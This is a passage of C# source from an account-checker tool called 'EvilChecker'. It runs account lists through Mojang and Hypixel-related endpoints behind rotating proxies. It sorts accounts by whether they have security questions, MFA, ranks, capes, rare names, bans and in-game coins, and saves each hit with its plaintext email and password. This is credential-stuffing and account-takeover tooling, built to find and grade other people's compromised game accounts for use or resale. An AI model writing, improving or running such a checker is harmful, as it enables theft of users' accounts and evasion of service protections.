using System;
using System.Drawing;
using System.IO;
using System.Threading;
using xNet;
using Console = Colorful.Console;
using CloudflareSolverRe;
using System.Security.Cryptography;

namespace EvilChecker.Minecraft_General
{
    class Minecraft
    {
        public static void Check_Minecraft_stat(string[] account, string token, string name, string uuid)
        {
            string accounttype = SFA(token);
            Severstat ss = new Severstat();
            ss.mfa = MFA(account[0], account[1]);
            if (MainChecker.check_hypixel_level || MainChecker.check_hypixel_rank || MainChecker.check_hypixel_GameStats)
            {
                switch (MainChecker.hypixel_API)
                {
                    case 1:
                        ss = Hypixel_API_1(name, ss);
                        break;
                    case 2:
                        ss = Hypixel_API_2(name, ss);
                        break;
                }
            }
            else
            {
                ss.hypixellevel = "";
                ss.hypixelRank = "";
                ss.hypixelUHClevel = "";
                ss.hypixelbedwarslevel = "";
                ss.hypixelskywarslevel = "";
            }
            if (MainChecker.check_hypixel_Skyblock)
            {
                ss = Hypixel_Skyblock(name, ss);
            }
            else
            {
                ss.hypixelSkyblockCoin = "";
                ss.hypixelSkyblockFairy_Souls = "";
                ss.hypixelSkyblockKills = "";
            }
            if (MainChecker.check_minecon)
            {
                ss.minecon = Minecon(uuid);
            }
            else
            {
                ss.minecon = "";
            }
            if (MainChecker.check_optifine)
            {
                if (Optifine(name))
                {
                    //ss.optifine = new BanChecker().BanCheckerMain(name, token, uuid, true);
                    ss.optifine = " - Optifine:true";
                }
                else
                {
                    ss.optifine = "";
                }
            }
            else
            {
                ss.optifine = "";
            }
            if (MainChecker.check_ogname)
            {
                if (name.Length <= 3)
                {
                    ss.ogname = " - OGname:3 character";
                }else if (MainChecker.ognamelist.Contains(name))
                {
                    ss.ogname = " - OGname:Special";
                }
                else
                {
                    ss.ogname = "";
                }
            }
            else
            {
                ss.ogname = "";
            }
            if (MainChecker.check_ban)
            {
                string banreason = new BanChecker().BanCheckerMain(name, token, uuid);
                if (banreason == "Unban")
                {
                    ss.banstat = " - HypixelStat:Unban";
                }
                else
                {
                    ss.banstat = " - HypixelStat:Banned " + banreason;
                }
            }
            else
            {
                ss.banstat = "";
            }

            //Stat Sorter
            lock (MainChecker.locker_Save_account)
            {
                Save_accounts(ss, accounttype, account);
            }

            if (MainChecker.check_ban)
            {
                if (ss.banstat == " - HypixelStat:Unban")
                {
                    Console.WriteLine("[" + accounttype + "]" + name + ":" + account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname, Color.Gold);
                }
                else if (ss.banstat == " - HypixelStat:Banned ")
                {
                    Console.WriteLine("[" + accounttype + "]" + name + ":" + account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname, Color.Red);
                }
                else
                {
                    Console.WriteLine("[" + accounttype + "]" + name + ":" + account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname, Color.Green);
                }
            }
            else
            {
                    Console.WriteLine("[" + accounttype + "]" + name + ":" + account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname, Color.Aqua);
            }
        }
        private static void Save_accounts(Severstat ss, string accounttype, string[] account)
        {
            string direc;
            if (MainChecker.check_ban)
            {
                if (ss.banstat == " - HypixelStat:Unban")
                {
                    direc = "Unban";
                }
                else if(ss.banstat == " - HypixelStat:Banned ")
                {
                    direc = "Banned";
                }
                else
                {
                    direc = "Semi-Banned";
                }
            }
            else
            {
                if (accounttype == "NFA")
                {
                    direc = "NFA";
                }
                else
                {
                    direc = "SFA";
                }
            }
            for (int b = 0; b < MainChecker.hitSorter_.Length; b++)
            {
                if (MainChecker.hitSorter_[b].Replace("\r", "") == "OptifineCape" & ss.optifine != "")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\Capes"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\Capes");
                    }
                    File.AppendAllText(MainChecker.directory + "\\" + direc + "\\Capes\\Optifine.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "MojangCape" & ss.minecon != "")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\Capes"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\Capes");
                    }
                    File.AppendAllText(MainChecker.directory + "\\" + direc + "\\Capes\\MojangCape.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "Hypixel_Skyblock" & (ss.hypixelSkyblockCoin != "" || ss.hypixelSkyblockFairy_Souls != "" || ss.hypixelSkyblockKills != ""))
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\SkyBlocks"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\SkyBlocks");
                    }
                    if(ss.hypixelSkyblockCoin != "")
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\SkyBlocks\\Coin.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else if(ss.hypixelSkyblockFairy_Souls != "")
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\SkyBlocks\\Fairy_Soul.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\SkyBlocks\\Kill.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");

                    }
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "Hypixel_Ranked" & ss.hypixelRank != "")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\Ranks\\"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\Ranks\\");
                    }
                    File.AppendAllText(MainChecker.directory + "\\" + direc + "\\Ranks\\" + ss.hypixelRank.Replace(" - HypixelRanked:", "") + ".txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "Hypixel_Game" & (ss.hypixelUHClevel != "" || ss.hypixelskywarslevel != "" || ss.hypixelbedwarslevel != "")) 
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\GameStats"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\GameStats");
                    }
                    if(ss.hypixelUHClevel != "")
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\GameStats\\UHC.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else if(ss.hypixelskywarslevel != "")
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\GameStats\\Skywars.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\GameStats\\Bedwars.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "Hypixel_Leveled" & ss.hypixellevel != "")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\Leveleds"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\Leveleds");
                    }
                    if (ss.levelstage == 2)
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\Leveleds\\Leveled " + MainChecker.hypixel_level_stage2 + "+.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\Leveleds\\Leveled " + MainChecker.hypixel_level_stage1 + "+.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "MFA" & ss.mfa != "")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc);
                    }
                    File.AppendAllText(MainChecker.directory + "\\" + direc + "\\MFA.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "OGname" & ss.ogname != "")
                {

                    if (!Directory.Exists(MainChecker.directory + "\\" + direc + "\\OGnames"))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc + "\\OGnames");
                    }
                    if (ss.ogname == " - OGname:3 character")
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\OGnames\\3 character.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    else
                    {
                        File.AppendAllText(MainChecker.directory + "\\" + direc + "\\OGnames\\Special.txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    }
                    break;
                }
                else if (MainChecker.hitSorter_[b].Replace("\r", "") == "NONE")
                {
                    if (!Directory.Exists(MainChecker.directory + "\\" + direc))
                    {
                        Directory.CreateDirectory(MainChecker.directory + "\\" + direc);
                    }
                    File.AppendAllText(MainChecker.directory + "\\" + direc + "\\" + accounttype + ".txt", account[0] + ":" + account[1] + ss.hypixellevel + ss.hypixelRank + ss.hypixelUHClevel + ss.hypixelskywarslevel + ss.hypixelbedwarslevel + ss.hypixelSkyblockCoin + ss.hypixelSkyblockFairy_Souls + ss.hypixelSkyblockKills + ss.banstat + ss.optifine + ss.minecon  + ss.mfa + ss.ogname + "\r\n");
                    break;
                } 
            }

        }
        private static string SFA(string Token)
        {
            String sfa;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader("Authorization", "Bearer " + Token);
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    sfa = http.Get("https://api.mojang.com/user/security/challenges").ToString();

                }
                catch
                {
                    sfa = "";
                    continue;
                }
            } while (sfa == "");
            if(sfa == "[]")
            {
                sfa = "SFA";
            }
            else
            {
                sfa = "NFA";
            }
            return (sfa);
        }
        private static Severstat Hypixel_API_1(string name, Severstat ss)
        {
            string hypixel;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    hypixel = http.Get("https://plancke.io/hypixel/player/stats/" + name).ToString();
                }
                catch
                {
                    hypixel = "";
                    continue;
                }
            } while (hypixel == "" || hypixel.Contains("Invalid API key") || hypixel.Contains("[Request]An exception occurred when get hypixel info") || hypixel.Contains("Access denied | plancke.io used Cloudflare to restrict access"));
            int hylevel = 0;

            if (MainChecker.check_hypixel_level)
            {
                try
                {
                    hylevel = Convert.ToInt32(Convert.ToDouble(Somemould.Getsubstring(hypixel, "Level:</b> ", "<")));
                    if (hylevel >= MainChecker.hypixel_level_stage2)
                    {
                        ss.levelstage = 2;
                        ss.hypixellevel = " - HypixelLeveled:" + hylevel.ToString();
                    }
                    else if (hylevel >= MainChecker.hypixel_level_stage1)
                    {
                        ss.levelstage = 1;
                        ss.hypixellevel = " - HypixelLeveled:" + hylevel.ToString();
                    }
                    else
                    {
                        ss.hypixellevel = "";
                    }
                }
                catch
                {
                    ss.hypixellevel = "";
                }
            }
            else
            {
                ss.hypixellevel = "";
            }

            if (MainChecker.check_hypixel_rank)
            {
                string hyRank = Somemould.Getsubstring(hypixel, "property=\"og:description\" content=\"[", "]");
                if (hyRank != "")
                {
                    ss.hypixelRank = " - HypixelRanked:" + hyRank;
                }
                else
                {
                    ss.hypixelRank = "";
                }
            }
            else
            {
                ss.hypixelRank = "";
            }

            if (MainChecker.check_hypixel_GameStats)
            {
                int hypixel_score;
                try
                {
                    hypixel_score = Convert.ToInt32(Somemould.Getsubstring(hypixel, "</li><li><b>Score:</b> ", "<"));
                }
                catch
                {
                    ss.hypixelUHClevel = "";
                    return ss;
                }
                if (hypixel_score < 10)
                {
                    hypixel_score = 1;
                }
                else if (10 <= hypixel_score & hypixel_score < 60)
                {
                    hypixel_score = 2;
                }
                else if (60 <= hypixel_score & hypixel_score < 210)
                {
                    hypixel_score = 3;
                }
                else if (210 <= hypixel_score & hypixel_score < 460)
                {
                    hypixel_score = 4;
                }
                else if (460 <= hypixel_score & hypixel_score < 960)
                {
                    hypixel_score = 5;
                }
                else if (960 <= hypixel_score & hypixel_score < 1710)
                {
                    hypixel_score = 6;
                }
                else if (1710 <= hypixel_score & hypixel_score < 2710)
                {
                    hypixel_score = 7;
                }
                else if (2710 <= hypixel_score & hypixel_score < 5210)
                {
                    hypixel_score = 8;
                }
                else if (5210 <= hypixel_score & hypixel_score < 10210)
                {
                    hypixel_score = 9;
                }
                else if (10210 <= hypixel_score & hypixel_score < 13210)
                {
                    hypixel_score = 10;
                }
                else if (13210 <= hypixel_score & hypixel_score < 16210)
                {
                    hypixel_score = 11;
                }
                else if (16210 <= hypixel_score & hypixel_score < 19210)
                {
                    hypixel_score = 12;
                }
                else if (19210 <= hypixel_score & hypixel_score < 22210)
                {
                    hypixel_score = 13;
                }
                else if (22210 <= hypixel_score & hypixel_score < 25210)
                {
                    hypixel_score = 14;
                }
                else if (25210 <= hypixel_score)
                {
                    hypixel_score = 15;
                }
                if (hylevel >= 10 & hypixel_score >= MainChecker.hypixel_uhcminlevel)
                {
                    ss.hypixelUHClevel = " - HypixelUHC:" + hypixel_score.ToString();
                }
                else
                {
                    ss.hypixelUHClevel = "";
                }
                try
                {
                    int bedwars = Convert.ToInt32(Somemould.Getsubstring(hypixel, "</li><li><b>Level:</b> ", "<"));
                    if(bedwars >= MainChecker.hypixel_bedwarsminlevel)
                    {
                        ss.hypixelbedwarslevel = " - HypixelBedwars:" + bedwars.ToString();

                    }
                    else
                    {
                        ss.hypixelbedwarslevel = "";

                    }
                }
                catch
                {
                    ss.hypixelbedwarslevel = "";
                }

                try
                {
                    int skywars = Convert.ToInt32(Somemould.Getsubstring(hypixel, "ed\"><li><b>Level:</b> ", "<"));
                    if (skywars >= MainChecker.hypixel_skywarsminlevel)
                    {
                        ss.hypixelskywarslevel = " - HypixelSkywars:" + skywars.ToString();

                    }
                    else
                    {
                        ss.hypixelskywarslevel = "";

                    }
                }
                catch
                {
                    ss.hypixelskywarslevel = "";
                }

            }
            else
            {
                ss.hypixelUHClevel = "";
                ss.hypixelbedwarslevel = "";
                ss.hypixelskywarslevel = "";
            }

            return ss;
        }
        private static Severstat Hypixel_API_2(string name,Severstat ss)
        {
            string hypixel;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    hypixel = http.Get("https://api.slothpixel.me/api/players/" + name).ToString();
                }
                catch
                {
                    hypixel = "";
                    continue;
                }
            } while (hypixel == "" || hypixel.Contains("Invalid API key") || hypixel.Contains("[Request]An exception occurred when get hypixel info") || hypixel.Contains("Access denied | plancke.io used Cloudflare to restrict access"));
            if (!hypixel.Contains("\"username\":\""))
            {
                ss.hypixelbedwarslevel = "";
                ss.hypixellevel = "";
                ss.hypixelRank = "";
                ss.hypixelskywarslevel = "";
                ss.hypixelUHClevel = "";
                return ss;
            }

            int hylevel = 0;
            if (MainChecker.check_hypixel_level)
            {
                try
                {
                    hylevel = Convert.ToInt32(Convert.ToDouble(Somemould.Getsubstring(hypixel, "level\":", ",")));
                    if (hylevel >= MainChecker.hypixel_level_stage2)
                    {
                        ss.levelstage = 2;
                        ss.hypixellevel = " - HypixelLeveled:" + hylevel.ToString();
                    }
                    else if (hylevel >= MainChecker.hypixel_level_stage1)
                    {
                        ss.levelstage = 1;
                        ss.hypixellevel = " - HypixelLeveled:" + hylevel.ToString();
                    }
                    else
                    {
                        ss.hypixellevel = "";
                    }
                }
                catch
                {
                    ss.hypixellevel = "";
                }
            }
            else
            {
                ss.hypixellevel = "";
            }

            if (MainChecker.check_hypixel_rank)
            {
                string hyRank = Somemould.Getsubstring(hypixel, "rank\":\"", "\"").Replace("_","").Replace("PLUS", "+");
                if (hyRank != "")
                {
                    ss.hypixelRank = " - HypixelRanked:" + hyRank;
                }
                else
                {
                    ss.hypixelRank = "";
                }
            }
            else
            {
                ss.hypixelRank = "";
            }

            if (MainChecker.check_hypixel_GameStats)
            {
                int hypixel_score;
                try
                {
                    string UHC_stat = Somemould.Getsubstring(hypixel, "UHC\":{\"coins", "heads_eaten");
                    hypixel_score = Convert.ToInt32(Somemould.Getsubstring(hypixel, "score\":", ","));
                }
                catch
                {
                    ss.hypixelUHClevel = "";
                    return ss;
                }
                if (hypixel_score < 10)
                {
                    hypixel_score = 1;
                }
                else if (10 <= hypixel_score & hypixel_score < 60)
                {
                    hypixel_score = 2;
                }
                else if (60 <= hypixel_score & hypixel_score < 210)
                {
                    hypixel_score = 3;
                }
                else if (210 <= hypixel_score & hypixel_score < 460)
                {
                    hypixel_score = 4;
                }
                else if (460 <= hypixel_score & hypixel_score < 960)
                {
                    hypixel_score = 5;
                }
                else if (960 <= hypixel_score & hypixel_score < 1710)
                {
                    hypixel_score = 6;
                }
                else if (1710 <= hypixel_score & hypixel_score < 2710)
                {
                    hypixel_score = 7;
                }
                else if (2710 <= hypixel_score & hypixel_score < 5210)
                {
                    hypixel_score = 8;
                }
                else if (5210 <= hypixel_score & hypixel_score < 10210)
                {
                    hypixel_score = 9;
                }
                else if (10210 <= hypixel_score & hypixel_score < 13210)
                {
                    hypixel_score = 10;
                }
                else if (13210 <= hypixel_score & hypixel_score < 16210)
                {
                    hypixel_score = 11;
                }
                else if (16210 <= hypixel_score & hypixel_score < 19210)
                {
                    hypixel_score = 12;
                }
                else if (19210 <= hypixel_score & hypixel_score < 22210)
                {
                    hypixel_score = 13;
                }
                else if (22210 <= hypixel_score & hypixel_score < 25210)
                {
                    hypixel_score = 14;
                }
                else if (25210 <= hypixel_score)
                {
                    hypixel_score = 15;
                }
                if (hylevel >= 10 & hypixel_score >= MainChecker.hypixel_uhcminlevel)
                {
                    ss.hypixelUHClevel = " - HypixelUHC:" + hypixel_score.ToString();
                }
                else
                {
                    ss.hypixelUHClevel = "";
                }
                try
                {
                    int bedwars = Convert.ToInt32(Somemould.Getsubstring(Somemould.Getsubstring(hypixel, "\"BedWars\":", "level_formatted"), "level\":", ","));
                    if (bedwars >= MainChecker.hypixel_bedwarsminlevel)
                    {
                        ss.hypixelbedwarslevel = " - HypixelBedwars:" + bedwars.ToString();

                    }
                    else
                    {
                        ss.hypixelbedwarslevel = "";

                    }
                }
                catch
                {
                    ss.hypixelbedwarslevel = "";
                }

                try
                {
                    int skywars = Convert.ToInt32(Convert.ToDouble(Somemould.Getsubstring(Somemould.Getsubstring(hypixel, "SkyWars\":{\"coins", "levelFormatted"), "level\":", ",")));
                    if (skywars >= MainChecker.hypixel_skywarsminlevel)
                    {
                        ss.hypixelskywarslevel = " - HypixelSkywars:" + skywars.ToString();

                    }
                    else
                    {
                        ss.hypixelskywarslevel = "";

                    }
                }
                catch
                {
                    ss.hypixelskywarslevel = "";
                }

            }
            else
            {
                ss.hypixelUHClevel = "";
                ss.hypixelbedwarslevel = "";
                ss.hypixelskywarslevel = "";
            }
            return ss;
        }
        private static Severstat Hypixel_Skyblock(string name, Severstat ss)
        {
            string coin;
            do
            {
                try
                {
                    HttpRequest http = new HttpRequest();
                    http.IgnoreProtocolErrors = true;
                    http.KeepAlive = true;
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    coin = http.Get("https://sky.shiiyu.moe/api/v2/coins/" + name).ToString();

                }
                catch
                {
                    coin = "";
                    continue;
                }
            } while (coin == "");
            if (coin.Contains("purse"))
            {
                coin = coin.Replace("profile_id", "*");
                string[] coins = coin.Split('*');
                int hypixelSkyblockCoin = 0;
                foreach (string coin_ in coins)
                {
                    try
                    {
                        hypixelSkyblockCoin = hypixelSkyblockCoin + Convert.ToInt32(Convert.ToDouble(Somemould.Getsubstring(coin_, "purse\":", "}")));
                    }
                    catch
                    {

                    }
                }
                if (hypixelSkyblockCoin >= MainChecker.hypixel_skyblock_mincoin)
                {
                    ss.hypixelSkyblockCoin = " - SkyblockCoin:" + hypixelSkyblockCoin.ToString();
                }
                else
                {
                    ss.hypixelSkyblockCoin = "";
                }
            }
            else
            {
                ss.hypixelSkyblockCoin = "";
            }

            string profile;
            do
            {
                try
                {
                    HttpRequest http = new HttpRequest();
                    http.IgnoreProtocolErrors = true;
                    http.KeepAlive = true;
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    profile = http.Get("https://sky.shiiyu.moe/api/v2/profile/" + name).ToString();

                }
                catch
                {
                    profile = "";
                    continue;
                }
            } while (profile == "");

            if (profile.Contains("profile_id"))
            {
                profile = profile.Replace("profile_id", "*");
                string[] profile_ = profile.Split('*');
                int fairy_soul_num = 0;
                int kills_num = 0;
                foreach (string profile_sp in profile_)
                {
                    try
                    {
                        fairy_soul_num = fairy_soul_num + Convert.ToInt32(Somemould.Getsubstring(profile_sp, "fairy_souls_collected\":", ","));
                    }
                    catch
                    {

                    }
                    try
                    {
                        kills_num = kills_num + Convert.ToInt32(Somemould.Getsubstring(profile_sp, "\"kills\":", ","));
                    }
                    catch
                    {

                    }
                }
                if (fairy_soul_num >= MainChecker.hypixel_skyblock_minsouls)
                {
                    ss.hypixelSkyblockFairy_Souls = " - SkyblockFairySouls:" + fairy_soul_num.ToString();
                }
                else
                {
                    ss.hypixelSkyblockFairy_Souls = "";
